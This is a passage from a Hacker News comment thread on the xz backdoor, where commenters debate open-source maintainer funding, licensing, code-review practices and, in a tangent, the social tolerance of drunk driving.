ago](item?id=39884988)   | [root](#39883063) | [parent](#39883738) | [next](#39884038) [–]  tragedy of the commons. If someone else can pay to maintain it, but you get the benefits, then it's the obvious strategy to use. And also, there's zero evidence that proprietary software won't have these backdoors. In fact, you can't even check them for it! | | --- | --- | --- | | | |  |  | [rubymamis](user?id=rubymamis) [9 months ago](item?id=39885169)   | [root](#39883063) | [parent](#39884988) | [next](#39884038) [–]  That's why I think such OSS packages should use licenses that force large companies to pay (moderate) fees for maintenance. I assume such sums of money won't even tickle them. Imagine 10 large companies, each pay $1000 a month for critical packages they use. For each developer, that's $10,000 they can either use to quit their current job or hire another person to share the burden. We need to normalize this. | | --- | --- | --- | | | |  |  | [chuckadams](user?id=chuckadams) [9 months ago](item?id=39885794)   | [root](#39883063) | [parent](#39885169) | [next](#39895821) [–]  You may as well just slap a "no commercial use" restriction on it. It takes months to go through procurement at the average big company, and still would if the package cost $1. Developers at these companies will find something else without the friction. | | --- | --- | --- | | | |  |  | [rubymamis](user?id=rubymamis) [9 months ago](item?id=39885895)   | [root](#39883063) | [parent](#39885794) | [next](#39895821) [–]  Maybe we need a platform to make this easier? | | --- | --- | --- | | | |  |  | [nicce](user?id=nicce) [9 months ago](item?id=39886040)   | [root](#39883063) | [parent](#39885895) | [next](#39895821) [–]  There is already GitHub Sponsors, for example. What we need to change from that? | | --- | --- | --- | | | |  |  | [rubymamis](user?id=rubymamis) [9 months ago](item?id=39886242)   | [root](#39883063) | [parent](#39886040) | [next](#39895821) [–]  I’m not an expert on this. if it ticks all the legal and other issues big companies need to deal with in a frictionless manner, then that’s good. If not, maybe a different solution is needed. | | --- | --- | --- | | | |  |  | [bdd8f1df777b](user?id=bdd8f1df777b) [9 months ago](item?id=39895821)   | [root](#39883063) | [parent](#39885169) | [prev](#39885794) | [next](#39884038) [–]  You are conflating convenience with necessity. Currently large companies also use xz simply because it is configured to be the default in many distributions. If it charges them money, they will just move to zstd, brottoli, gzip or 7z. The first two are backed by large companies themselves who will not adopt these kind of licenses ever. | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [9 months ago](item?id=39884038)   | [root](#39883063) | [parent](#39883711) | [prev](#39883738) | [next](#39883753) [–]  Not really. Just make your software AGPLv3. It's literally the most free license GNU and the FSF have ever come up with. It ensures your freedom so hard the corporations cannot tolerate it. Now you have leverage. If the corporations want it so bad, they *can* have it. They just gotta ask for permission to use it under different terms. Then they gotta pay for it. <https://www.gnu.org/philosophy/selling-exceptions.html> All you have to do is not MIT or BSD license the software. When you do that, you're essentially transferring your intellectual property to the corporations at zero cost. Can't think of a bigger wealth transfer in history. From well meaning individual programmers and straight to the billionaires. The BSD style openness only makes sense in a world without intellectual property. Until the day copyright is abolished, it's either AGPLv3 or all rights reserved. Nothing else makes sense. | | --- | --- | --- | | | |  |  | [krick](user?id=krick) [9 months ago](item?id=39884152)   | [root](#39883063) | [parent](#39884038) | [next](#39883753) [–]  The problem is, there will be almost zero packages that (very few) "corporations want so bad". The only exception might be cloud providers, that want to host your mildly-popular open-source message queue, but, again, if you are Amazon, you'll soon just re-implement that message queue, drop the "original" one, and after a couple of years your mildly-popular project will become not popular at all. | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [9 months ago](item?id=39884892)   | [root](#39883063) | [parent](#39884152) | [next](#39883753) [–]  In that case we'll simply end up exactly where we started. There's a twist though. This time around we're not being taken for fools and exploited. Better to have a completely irrelevant forgotten project than a massively popular one that makes us zero dollars while CEOs make billions off of it. This post always comes to mind every time this topic comes up: [https://web.archive.org/web/20120620103603/http://zedshaw.co...](https://web.archive.org/web/20120620103603/http%3A//zedshaw.com/essays/why_i_gpl.html) > I want people to appreciate the work I’ve done and the value of what I’ve made. > Not pass on by waving “sucker” as they drive their fancy cars. | | --- | --- | --- | | | |  |  | [nicce](user?id=nicce) [9 months ago](item?id=39885913)   | [root](#39883063) | [parent](#39884892) | [next](#39883753) [–]  That is a really good post from 15? years ago, and still very relevant to this day. | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [9 months ago](item?id=39886675)   | [root](#39883063) | [parent](#39885913) | [next](#39883753) [–]  Yeah, I've never forgotten it. He hasn't stopped blogging either. <https://zedshaw.com/blog/2022-02-05-the-beggar-barons/> [https://zedshaw.com/blog/2018-03-25-the-billionaires-vs-bran...](https://zedshaw.com/blog/2018-03-25-the-billionaires-vs-brandonm/) That last link is about this place and covers some abuse he got here on HN over that GPL article. All the way back from 2009. | | --- | --- | --- | | | |  |  | [concordDance](user?id=concordDance) [9 months ago](item?id=39883753)   | [parent](#39883063) | [prev](#39883711) | [next](#39885726) [–]  > It baffles me how such an important package that so many Linux servers use every day is unmaintained by the original author due to insufficient funds. Is it actually insufficient funds or is it burnout? | | --- | --- | --- | | | |  |  | [rubymamis](user?id=rubymamis) [9 months ago](item?id=39883776)   | [root](#39883063) | [parent](#39883753) | [next](#39884488) [–]  I'm not sure. I know from working on OSS projects personally that insufficient funds can easily lead to burnout as well. You gotta find other sources of revenue while STILL maintaining your OSS project. | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39884488)   | [root](#39883063) | [parent](#39883753) | [prev](#39883776) | [next](#39883865) [–]  In the case of XZ it was more akin to burnout based on the literature around the time Jia Tan was instated. | | --- | --- | --- | | | |  |  | [dingnuts](user?id=dingnuts) [9 months ago](item?id=39883865)   | [root](#39883063) | [parent](#39883753) | [prev](#39884488) | [next](#39885726) [–]  same thing; if you have money you can hire people to spread the burden | | --- | --- | --- | | | |  |  | [anticristi](user?id=anticristi) [9 months ago](item?id=39885726)   | [parent](#39883063) | [prev](#39883753) | [next](#39886276) [–]  The proposed EU Cyber resilience Act positions itself to be a solution. To put it simply, vendors are responsible for vulnerabilities throughout the lifetime of their products, whether that is a firewall or a toaster. Thus, the vendors are incentives to keep OSS secure, whether that means paying maintainers, commissioning code audits or hiring FTEs to contribute. | | --- | --- | --- | | | |  |  | [halJordan](user?id=halJordan) [9 months ago](item?id=39886276)   | [parent](#39883063) | [prev](#39885726) | [next](#39887291) [–]  There's a difference between important and necessary. The package is necessary not important. | | --- | --- | --- | | | |  |  | [grumpyprole](user?id=grumpyprole) [9 months ago](item?id=39887291)   | [parent](#39883063) | [prev](#39886276) | [next](#39880261) [–]  It baffles me why something as complex as xz is apparently needed. The code for bzip2 is tiny and would need a small fraction of one person to maintain. | | --- | --- | --- | | | |  |  | [tevon](user?id=tevon) [9 months ago](item?id=39880261)   | [prev](#39883063) | [next](#39880433) [–]  Currently if you visit the xz repository it is disabled for violating github's TOS. While it should clearly be disabled, I feel like github should leave the code and history up, while displaying a banner (and disabled any features that could be exploited), so that researchers and others can learn about the exploit. In more minor situations when a library is hosting malicious code, if I found the repo to be down I might not think anything of it. | | --- | --- | --- | | | |  |  | [jhfdbkofdchk](user?id=jhfdbkofdchk) [9 months ago](item?id=39880287)   | [parent](#39880261) | [next](#39880584) [–]  I imagine they don’t want automation downloading it. | | --- | --- | --- | | | |  |  | [Randalthorro](user?id=Randalthorro) [9 months ago](item?id=39880584)   | [parent](#39880261) | [prev](#39880287) | [next](#39881782) [–]  You can find GitHub events from the repo as a csv here <https://github.com/emirkmo/xz-backdoor-github> If you are interested in the source code that is easy to find. This code and git repo are linked all over the world, in many git repos, and the source is bundled many times in releases as well. | | --- | --- | --- | | | |  |  | [shp0ngle](user?id=shp0ngle) [9 months ago](item?id=39881782)   | [parent](#39880261) | [prev](#39880584) | [next](#39880433) [–]  xz has its own git mirror where you can see all the commits | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39884497)   | [root](#39880261) | [parent](#39881782) | [next](#39880433) [–]  Notably only writable by Lasse who I personally believe is a Good Actor here. | | --- | --- | --- | | | |  |  | [tigerlily](user?id=tigerlily) [9 months ago](item?id=39880433)   | [prev](#39880261) | [next](#39878762) [–]  As a *de facto* maintainer of an obscure open source game, I see devs come and go. I just merge all the worthwhile contributions. Some collaborators go pretty deep with their features, with a variety of coding styles, in a mishmash of C and C++. I'm not always across the implementation details, but in the back of my mind I'm thinking, man, anyone could just code up some real nasty backdoor and the project would be screwed. Lucky the game is so obscure and the attack surface minuscule, but it did stop me from any temptation to sign Windows binaries out of any sense of munificence. This xz backdoor is just the most massive nightmare, and I really feel for the og devs, and anyone who got sucked in by this. | | --- | --- | --- | | | |  |  | [p-e-w](user?id=p-e-w) [9 months ago](item?id=39880672)   | [parent](#39880433) | [next](#39880972) [–]  > but in the back of my mind I'm thinking, man, anyone could just code up some real nasty backdoor and the project would be screwed That's true of course, but it's not a problem specific to software. In fact, I'm not even sure it's a "problem" in a meaningful sense at all. When you're taking a walk on a forest road, any car that comes your way could just run you over. Chances are the driver would never get caught. There is nothing you can do to protect yourself against it. Police aren't around to help you. This horror scenario, much worse than a software backdoor, is actually the minimum viable danger that you need to accept in order to be able to do anything at all. And yes, sometimes it does really happen. But at the end of the day, the vast majority of people just don't seek to actively harm others. Everything humans do relies on that assumption, and always has. The fantasy that if code review was just a little tighter, if more linters, CI mechanisms, and pattern matching were employed, if code signing was more widespread, if we verified people's identities etc., if all these things were implemented, then such scenarios could be prevented, that fantasy is the real problem. It's symptomatic of the insane Silicon Valley vision that the world can and should be managed and controlled at every level of detail. Which is a "cure" that would be much worse than any disease it could possibly prevent. | | --- | --- | --- | | | |  |  | [imiric](user?id=imiric) [9 months ago](item?id=39881102)   | [root](#39880433) | [parent](#39880672) | [next](#39881403) [–]  > When you're taking a walk on a forest road, any car that comes your way could just run you over. Chances are the driver would never get caught. There is nothing you can do to protect yourself against it. Sure you can. You can be more vigilant and careful when walking near traffic. So maybe don't have headphones on, and engage all your senses on the immediate threats around you. This won't guarantee that a car won't run you over, but it reduces the chances considerably to where you can possibly avoid it. The same can be said about the xz situation. All the linters, CI checks and code reviews couldn't guarantee that this wouldn't happen, but they sure would lower the chances that it does. Having a defeatist attitude that nothing could be done to prevent it, and that therefore all these development practices are useless, is not helpful for when this happens again. The major problem with the xz case was the fact it had 2 maintainers, one who was mostly absent, and the other who gradually gained control over the project and introduced the malicious code. No automated checks could've helped in this case, when there were no code reviews, and no oversight over what gets merged at all. But had there been some oversight and thorough review from at least one other developer, then the chances of this happening would be lower. It's important to talk about probabilities here instead of absolute prevention, since it's possible that even in the strictest of environments, with many active contributors, malicious code could still theoretically be merged in. But without any of it, this approaches 100% (minus the probability of someone acting maliciously to begin with, having their account taken over, etc.). | | --- | --- | --- | | | |  |  | [p-e-w](user?id=p-e-w) [9 months ago](item?id=39881398)   | [root](#39880433) | [parent](#39881102) | [next](#39881403) [–]  It's not defeatist to admit and accept that some things are ultimately out of our control. And more importantly, that any attempt to increase control over them comes with downsides. An open source project that imposes all kinds of restrictions and complex bureaucratic checks before anything can get merged, is a project I wouldn't want to participate in. I imagine many others might feel the same. So perhaps the loss from such measures would be greater than the gain. Without people willing to contribute their time, open source cannot function. | | --- | --- | --- | | | |  |  | [imiric](user?id=imiric) [9 months ago](item?id=39882797)   | [root](#39880433) | [parent](#39881398) | [next](#39881403) [–]  > It's not defeatist to admit and accept that some things are ultimately out of our control. But that's the thing: deciding how software is built and which features are shipped to users \_is\_ under our control. The case with xz was exceptionally bad because of the state of the project, but in a well maintained project having these checks and oversight does help with delivering better quality software. I'm not saying that this type of sophisticated attack could've been prevented even if the project was well maintained, but this doesn't mean that there's nothing we can do about it. > And more importantly, that any attempt to increase control over them comes with downsides. That's a subjective opinion. I personally find linters and code reviews essential to software development, and if you think of them as being restrictions or useless bureaucratic processes that prevent you from contributing to a project then you're entitled to your opinion, but I disagree. The downsides you mention are simply minimum contribution requirements, and not having any at all would ultimately become a burden on everybody, lead to a chaotic SDLC, and to more issues being shipped to users. I don't have any empirical evidence to back this up, so this is also "just" my opinion based on working on projects with well-defined guidelines. I'm sure you would agree with the Optimistic Merging methodology[1]. I'd be curious to know whether this has any tangible benefits as claimed by its proponents. At first glance, a project like <https://github.com/zeromq/libzmq> doesn't appear to have a more vibrant community than a project of comparable size and popularity like <https://github.com/NixOS/nix>, while the latter uses the criticized "Pessimistic Merging" methodology. Perhaps I'm looking at the wrong signals, but I'm not able to see a clear advantage of OM, while I can see clear disadvantages of it. libzmq does have contribution guidelines[2], but a code review process is unspecified (even though it mentions having "systematic reviews"), and there are no testing requirements besides patches being required to "pass project self-tests". Who conducts reviews and when, or who works on tests is entirely unclear, though the project seems to have 75% coverage, so someone must be doing this. I'm not sure whether all of this makes contributors happier, but I sure wouldn't like to work on a project where this is unclear. > Without people willing to contribute their time, open source cannot function. Agreed, but I would argue that no project, open source or otherwise, can function without contribution guidelines that maintain certain quality standards. [1]: <https://news.ycombinator.com/item?id=39880972> [2]: <https://rfc.zeromq.org/spec/42/> | | --- | --- | --- | | | |  |  | [rb12345](user?id=rb12345) [9 months ago](item?id=39883445)   | [root](#39880433) | [parent](#39882797) | [next](#39881403) [–]  > But that's the thing: deciding how software is built and which features are shipped to users \_is\_ under our control. The case with xz was exceptionally bad because of the state of the project, but in a well maintained project having these checks and oversight does help with delivering better quality software. I'm not saying that this type of sophisticated attack could've been prevented even if the project was well maintained, but this doesn't mean that there's nothing we can do about it. In this particular case, having a static project or a single maintainer rarely releasing updates would actually be an improvement! The people/sockpuppets calling for more/faster changes to xz and more maintainers to handle that is exactly how we ended up with a malicious maintainer in charge in the first place. And assuming no CVEs or external breaking changes occur, why does that particular library need to change? | | --- | --- | --- | | | |  |  | [godelski](user?id=godelski) [9 months ago](item?id=39881403)   | [root](#39880433) | [parent](#39880672) | [prev](#39881102) | [next](#39880989) [–]  Honestly this is why I think we should pay people for open source projects. It is a tragedy of the commons issues. All of us benefit a lot from these free software, and done for free. Pay doesn't exactly fix the problems directly, but they do decrease the risk. Pay means people can work on these full time instead of on the side. Pay means it is harder to bribe someone. Pay also makes the people contributing feel better and more like their work is meaningful. Importantly, pay signals to these people that we care about them. I think the big tech should pay. We know the truth is that they'll pass on the costs to us anyways. I'd also be happy to pay taxes but that's probably harder. I'm not sure what the best solution is and this is clearly only a part of a much larger problem, but I think it is very important that we actually talk about how much value OSS has. If we're going to talk about how money represents value of work, we can't just ignore how much value is generated from OSS and only talk about what's popular and well know. There are tons of critical infrastructure in every system you could think of (traditional engineering, politics, anything) that is unknown. We shouldn't just pay things that are popular. We should definitely pay things that are important. Maybe the conversation can be different when AI takes all the jobs (lol) | | --- | --- | --- | | | |  |  | [arter4](user?id=arter4) [9 months ago](item?id=39882635)   | [root](#39880433) | [parent](#39881403) | [next](#39881578) [–]  I get why, in principle, we should pay people for open source projects, but I guess it doesn't make much of a difference when it comes to vulnerabilities. First off, there are a lot of ways to bring someone to "the dark side". Maybe it's blackmail. Maybe it's ideology ("the greater good"). Maybe it's just pumping their ego. Or maybe it's money, but not that much, and extra money can be helpful. There is a long history of people spying against their country or hacking for a variety of reasons, even if they had a job and a steady paycheck. You can't just pay people and expect them to be 100% honest for the rest of their life. Second, most (known) vulnerabilities are not backdoors. As any software developer knows, it's easy to make mistakes. This also goes for vulnerabilities. Even as a paid software developer, uou can definitely mess up a function (or method) and accidentally introduce an off-by-one vulnerability, or forget to properly validate inputs, or reuse a supposedly one-time cryptographic quantity. | | --- | --- | --- | | | |  |  | [godelski](user?id=godelski) [9 months ago](item?id=39885716)   | [root](#39880433) | [parent](#39882635) | [next](#39881578) [–]  I think it does make a difference when it comes to vulnerabilities and especially infiltrators. You're doing these things as a hobby. Outside of your real work. If it becomes too big for you it's hard to find help (exact case here). How do you pass on the torch when you want to retire? I think money can help alleviate pressure from both your points. No one says that money makes them honest. But if it's a full time job you are less likely to just quickly look and say lgtm. You make fewer mistakes when you're less stress or tired. It's harder to be corrupted because people would rather a stable job and career than a one time payout. Pay also makes it easier to trace. Again, it's not a 100% solution. Nothing will be! But it's hard to argue that this wouldn't alleviate significant pressure. [https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00567.html) | | --- | --- | --- | | | |  |  | [beanjuiceII](user?id=beanjuiceII) [9 months ago](item?id=39881578)   | [root](#39880433) | [parent](#39881403) | [prev](#39882635) | [next](#39880989) [–]  Ya so we could have paid this dude to put the exploits in our programs good IDEA y | | --- | --- | --- | | | |  |  | [godelski](user?id=godelski) [9 months ago](item?id=39882139)   | [root](#39880433) | [parent](#39881578) | [next](#39882720) [–]  If you're going to criticize me, at least read what I wrote first | | --- | --- | --- | | | |  |  | [Nuzzerino](user?id=Nuzzerino) [9 months ago](item?id=39882720)   | [root](#39880433) | [parent](#39881578) | [prev](#39882139) | [next](#39880989) [–]  Using what bank? He used a fake name and a VPN. | | --- | --- | --- | | | |  |  | [mendyberger](user?id=mendyberger) [9 months ago](item?id=39880989)   | [root](#39880433) | [parent](#39880672) | [prev](#39881403) | [next](#39880901) [–]  Difference is that software backdoors can effect billions of people. That driver on the road can't effect too many without being caught. In this case, had they been a bit more careful with performance, they could have effected millions of machines without being caught. There aren't many cases where a lone wolf can do so much damage outside of software. | | --- | --- | --- | | | |  |  | [taberiand](user?id=taberiand) [9 months ago](item?id=39881160)   | [root](#39880433) | [parent](#39880989) | [next](#39880901) [–]  A few more issues like this in crucial software and we might actually see the big companies stepping up to fund that kind of care and attention. | | --- | --- | --- | | | |  |  | [Dalewyn](user?id=Dalewyn) [9 months ago](item?id=39880901)   | [root](#39880433) | [parent](#39880672) | [prev](#39880989) | [next](#39880984) [–]  >But at the end of the day, the vast majority of people just don't seek to actively harm others. Everything humans do relies on that assumption, and always has. Wholeheartedly agree. Fundamentally, we all assume that people are operating with good will and establish trust with that as the foundation (granted to varying degrees depending on the culture, some are more trusting or skeptical than others). It's also why building trust takes ages and destroying it only takes seconds, and why violations of trust at all are almost always scathing to our very soul. We certainly *can* account for bad actors, and depending on what's at stake (eg: hijacking airliners) we do forego assuming good will. But taking that too far is a very uncomfortable world to live in, because it's counter to something very fundamental for humans and life. | | --- | --- | --- | | | |  |  | [keepamovin](user?id=keepamovin) [9 months ago](item?id=39880984)   | [root](#39880433) | [parent](#39880672) | [prev](#39880901) | [next](#39880695) [–]  This is a good take. But even in a forest, sometimes when tragedy strikes people do postmortems, question regulations and push for change. Sometimes, it does seem like the internet incentivizes or makes everyone else accessible to a higher ratio of people who seem to harm than normal. | | --- | --- | --- | | | |  |  | [consumer451](user?id=consumer451) [9 months ago](item?id=39880695)   | [root](#39880433) | [parent](#39880672) | [prev](#39880984) | [next](#39880972) [–]  > But at the end of the day, the vast majority of people just don't seek to actively harm others. Everything humans do relies on that assumption, and always has. <https://en.wikipedia.org/wiki/Normalcy_bias> ? > It's symptomatic of the insane Silicon Valley vision that the world can and should be managed and controlled at every level of detail. Which is a "cure" that would be much worse than any disease it could possibly prevent. What "cure" would you recommend? | | --- | --- | --- | | | |  |  | [pmarreck](user?id=pmarreck) [9 months ago](item?id=39880806)   | [root](#39880433) | [parent](#39880695) | [next](#39880759) [–]  You need to accept that everything has a tradeoff and some amount of drama just seems to be built into the system. Take sex work, for example. Legalizing it leads to an overall increase in sex trafficking. But it also does this: [https://www.washingtonpost.com/news/wonk/wp/2014/07/17/when-...](https://www.washingtonpost.com/news/wonk/wp/2014/07/17/when-rhode-island-accidentally-legalized-prostitution-rape-and-stis-decreased-sharply/) My personal opinion is that if something is going to find a way to conduct itself in secret anyway (at high risk and cost) if it is banned, it is always better to just suck it up and permit it and regulate it in the open instead. Trafficked people are far easier to discover in an open market than a black one. Effects of anything (both positive and negative) are far easier to assess when the thing being assessed is legal. Should we ban cash because it incentivizes mugging and pickpocketing and theft? (I've been the victim of pickpocketing. The most valuable thing they took was an irreplaceable military ID I carried (I was long since inactive)... Not the $25 in cash in my wallet at the time.) I mean, there would literally be far fewer muggings if no one carried cash. Is it thus the cash's "fault"? | | --- | --- | --- | | | |  |  | [consumer451](user?id=consumer451) [9 months ago](item?id=39880863)   | [root](#39880433) | [parent](#39880806) | [next](#39880759) [–]  But there have to be specific trade-offs, in each case. I am reminded of the words of "a wise man." <https://news.ycombinator.com/item?id=39874049> *Captain's Log:* This entire branch of comments responding to OP is not helping advance humanity in any significant way. I would appreciate my statement of protest being noted by the alien archeologists who find these bits in the wreckage of my species. | | --- | --- | --- | | | |  |  | [Dalewyn](user?id=Dalewyn) [9 months ago](item?id=39880930)   | [root](#39880433) | [parent](#39880863) | [next](#39880759) [–]  I think drunk driving being an oil that keeps society lubricated cannot and should not be understated. Yes, drunk driving kills people and that's unacceptable. On the other hand, people going out to eat and drink with family, friends, and co-workers after work helps keep society functioning, and the police respect this reality because they don't arrest clearly-drunk patrons coming out of restaurants to drive back home. | | --- | --- | --- | | | |  |  | [Karrot\_Kream](user?id=Karrot_Kream) [9 months ago](item?id=39881127)   | [root](#39880433) | [parent](#39880930) | [next](#39880975) [–]  This is such a deeply American take that I can't help but laugh out loud. It's like going to a developing nation and saying that, while emissions from two stroke scooters kills people there's no alternative to get your life things done. | | --- | --- | --- | | | |  |  | [Dalewyn](user?id=Dalewyn) [9 months ago](item?id=39881922)   | [root](#39880433) | [parent](#39881127) | [next](#39890001) [–]  It certainly isn't just America, though we're probably certainly the most infamous example. I was in France for business once in the countryside (southern France), and the host took everyone (me, their employees, etc.) out to lunch. Far as I could tell it was just an everyday thing. Anyway, we drove about an hour to a nearby village and practically partied for a few hours. Wine flowed like a river. Then we drove back and we all got back to our work. So not only were we drunk driving, we were drunk working. Even Americans usually don't drink that hard; the French earned my respect that day, they know how to have a good time. Also many times in Japan, I would invite a business client/supplier or a friend over for dinner at a sushi bar. It's not unusual for some to drive rather than take the train, and then of course go back home driving after having had lots of beer and sake. Whether any of us like it or not, drunk driving is an oil that lubricates society. | | --- | --- | --- | | | |  |  | [kbenson](user?id=kbenson) [9 months ago](item?id=39882019)   | [root](#39880433) | [parent](#39881922) | [next](#39890001) [–]  > Even Americans usually don't drink that hard; the French earned my respect that day. Is drinking hard something so deserving of respect? Is working while impaired? To me this reads as "I like to fuck off and be irresponsible and man did these French guys show me how it's done!" | | --- | --- | --- | | | |  |  | [Dalewyn](user?id=Dalewyn) [9 months ago](item?id=39882106)   | [root](#39880433) | [parent](#39882019) | [next](#39890001) [–]  Except they weren't irresponsible. We all drove back just fine, and we all went back to work just as competently as before like nothing happened. It takes skill and maturity to have a good time but not so much that it would impair subsequent duties. The French demonstrated to me they have that down to a much finer degree than most of us have in America, so they have my respect. This isn't to say Americans are immature, mind you. For every drunk driving incident you hear on the news, hundreds of thousands if not millions of Americans drive home drunk without harming anyone for their entire lives. What I will admit is Americans would still refrain from drinking so much during lunch when we still have a work day left ahead of us, that's something we can take lessons from the French on. Life is short, so those who can have more happy hours without compromising their duties are the real winners. | | --- | --- | --- | | | |  |  | [djao](user?id=djao) [9 months ago](item?id=39885268)   | [root](#39880433) | [parent](#39882106) | [next](#39887807) [–]  As someone who knows people who died in a crash with another drunk driver, it is hard for me to accept your view. Certainly, at a bare minimum, the penalties for drunk driving that results in fatality should be much harsher than they are now -- at that point there is hard empirical evidence that you cannot be trusted to have the "skill and maturity" necessary for driving -- but we can't even bring ourselves to do that, not even for repeat offenders. Eventually I am optimistic that autonomous driving will solve the problem entirely, at least for those who are responsible drivers. In an era of widely available self-driving cars, if you choose to drive drunk, then that is an active choice, and no amount of "social lubrication" can excuse such degenerate behavior. | | --- | --- | --- | | | |  |  | [pmarreck](user?id=pmarreck) [9 months ago](item?id=39890067)   | [root](#39880433) | [parent](#39885268) | [next](#39885436) [–]  I am very sorry about your friend. I think the real problem is that people are really poor at assessing risk. And I think we can make some headway there, educationally, and it might actually affect how people reason around drunk driving (or their friends, assuming they still have their faculties). Let's take the example of driving home drunk without hurting anyone or having an accident. Suppose that (being optimistic) there's a 1% chance of an accident and a 0.1% chance of causing a fatality (including to self). Seems like an easy risk to take, right? But observe what happens if you drive home drunk 40 times: 99% chance of causing no accident each time, to the 40th power = 0.99^40 is roughly 67% chance that none of those 40 times results in an accident. 80 times? 45% chance of no accident. Now you're talking about flipping a coin to determine whether you cause an accident (potentially a fatal one, we'll get to that) at all over 80 attempts. (I feel like that is optimistic.) If I have a 99.9% chance of not killing someone when drunk-driving one time, after 80 times I have a 92% chance of not killing someone (that is, an 8% chance of killing someone). Again, this seems optimistic. Try tweaking the numbers to a 2% chance of an accident and a 1.2% chance of causing a fatality. Anyway, my point is that people are really terrible at evaluating the whole "re-rolling the dice multiple times" angle, since a single hit is a HUGE, potentially life-changing loss. (People are just as bad at evaluating success risk, as well, for similar reasons- a single large success is a potentially life-changing event) | | --- | --- | --- | | | |  |  | [Dalewyn](user?id=Dalewyn) [9 months ago](item?id=39885436)   | [root](#39880433) | [parent](#39885268) | [prev](#39890067) | [next](#39887807) [–]  I'm certainly not trying to understate the very real and very serious suffering that irresponsible drunk drivers can and do cause. If any of this came off like that then that was never my intention. When it comes to understanding drunk driving and especially why it is de facto tolerated by society despite its significant problems, it's necessary to consider the motivators and both positive and negative results. Simply saying "they are all irresponsible and should stop" and such with a handwave isn't productive. After all, society wouldn't tolerate a significant problem if there wasn't a significant benefit to doing so. | | --- | --- | --- | | | |  |  | [kbenson](user?id=kbenson) [9 months ago](item?id=39887807)   | [root](#39880433) | [parent](#39882106) | [prev](#39885268) | [next](#39890001) [–]  One of the well known effects of alcohol is impaired judgment. You're expecting people with some level of impaired judgment to make correct judgment calls. Skill and maturity can help, but are not a solution to that fundamental problem. Would you be okay with a surgeon operating on you in the afternoon drinking at lunch and working on you later while impaired? Is it okay for every person and job to be impaired, regardless of the responsibility of their situation? If not, why is operating a few thousand pound vehicle in public that can easily kill multiple people when used incorrectly okay? | | --- | --- | --- | | | |  |  | [pmarreck](user?id=pmarreck) [9 months ago](item?id=39890001)   | [root](#39880433) | [parent](#39881127) | [prev](#39881922) | [next](#39881361) [–]  If it's American to make counterarguments based on reason instead of ridicule, then hell, I'd much prefer to be an American than whatever the hell your judgmental buttocks is doing. And no, there is currently no substitute for a legal removal of your repression so that you can, say, get on with some shagging. I would love to see a study trying to determine what percentage of humans have only come into existence because of a bit of "social lubrication" For some people, alcohol is indeed "medicinal". | | --- | --- | --- | | | |  |  | [pierat](user?id=pierat) [9 months ago](item?id=39881361)   | [root](#39880433) | [parent](#39881127) | [prev](#39890001) | [next](#39880975) [–]  You can laugh out loud all you want, but there are mandatory parking minimums for bars across the USA. Yes, bars have parking lots, and a lot of spaces. The intent is to \*drive\* there, drink and maybe eat, and leave in some various state of drunkenness. Why else would the spacious parking lots be required? | | --- | --- | --- | | | |  |  | [brailsafe](user?id=brailsafe) [9 months ago](item?id=39880975)   | [root](#39880433) | [parent](#39880930) | [prev](#39881127) | [next](#39881704) [–]  What is more depressing is how we can acknowledge that reality and continue to do absolutely nothing to mitigate it but punish it, in many cases. The more people practically need to drive, the more people will drunk drive and kill people, yet in so many cases we just sort of stop there and be like "welp, guess that's just nature" instead of building viable alternatives. However the other theoretical possibly is that if people didn't need to drive, they might end up drinking more. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39881704)   | [root](#39880433) | [parent](#39880930) | [prev](#39880975) | [next](#39880759) [–]  drunk driving may kill a lot of people, but it also helps a lot of people get to work on time, so, it;s impossible to say if its bad or not, | | --- | --- | --- | | | |  |  | [p-e-w](user?id=p-e-w) [9 months ago](item?id=39880759)   | [root](#39880433) | [parent](#39880695) | [prev](#39880806) | [next](#39880972) [–]  > <https://en.wikipedia.org/wiki/Normalcy_bias> Indeed, that "bias" is a vital mechanism that enables societies to function. Good luck getting people to live together if they look at passerbys thinking "there is a 0.34% chance that guy is a serial killer". > What "cure" would you recommend? Accepting that not every problem can, or needs to be, solved. Today's science/tech culture suffers from an almost cartoonish god complex seeking to manage humanity into a glorious data-driven future. That isn't going to happen, and we're better off for it. People will still die in the future, and they will still commit crimes. Tomorrow, I might be the victim, as I already have been in the past. But that doesn't mean I want the insane hyper-control that some of our so-called luminaries are pushing us towards to become reality. | | --- | --- | --- | | | |  |  | [imiric](user?id=imiric) [9 months ago](item?id=39880972)   | [parent](#39880433) | [prev](#39880672) | [next](#39881348) [–]  The late author of ZeroMQ, Pieter Hintjens, advocated for a practice called Optimistic Merging[1], where contributions would be merged immediately, without reviewing the code or waiting for CI results. So your approach of having lax merging guidelines is not far off. While I can see the merits this has in building a community of contributors who are happy to work on a project, I always felt that it opens the project to grow without a clear vision or direction, and ultimately places too much burden on maintainers to fix contributions of others in order to bring them up to some common standard (which I surely expect any project to have, otherwise the mishmash of styles and testing practices would make working on the project decidedly not fun). It also delays the actual code review, which Pieter claimed does happen, to some unknown point in the future, when it may or may not be exhaustive, and when it's not clear who is actually responsible of conducting it or fixing any issues. It all sounds like a recipe for chaos where there is no control over what eventually gets shipped to users. But then again, I never worked on ZeroMQ or another project that adopted these practices, so perhaps you or someone else here can comment on what the experience is like. And then there's this issue of malicious code being shipped. This is actually brought up by a comment on that blog post[2], and Pieter describes exactly what happened in the xz case: > Let's assume Mallory is patient and deceitful and acts like a valid contributor long enough to get control over a project, and then slowly builds in his/her backdoors. Then careful code review won't help you. Mallory simply has to gain enough trust to become a maintainer, which is a matter of how, not if. And concludes that "the best defense [...] is size and diversity of the community". Where I think he's wrong is that a careful code review \_can\_ indeed reduce the chances of this happening. If all contributions are reviewed thoroughly, regardless if they're authored by a trusted or external contributor, then strange behavior and commits that claim to do one thing but actually do something else, are more likely to be spotted earlier than later. While OM might lead to a greater community size and diversity, which I think is debatable considering how many projects exist with a thriving community of contributors while also having strict contribution guidelines, it doesn't address how or when a malicious patch would be caught. If nobody is in charge of reviewing code, there are no testing standards, and maintainers have additional work keeping some type of control over the project's direction, how does this actually protect against this situation? The problem with xz wasn't a small community; it was \*no\* community. A single malicious actor got control of the project, and there was little oversight from 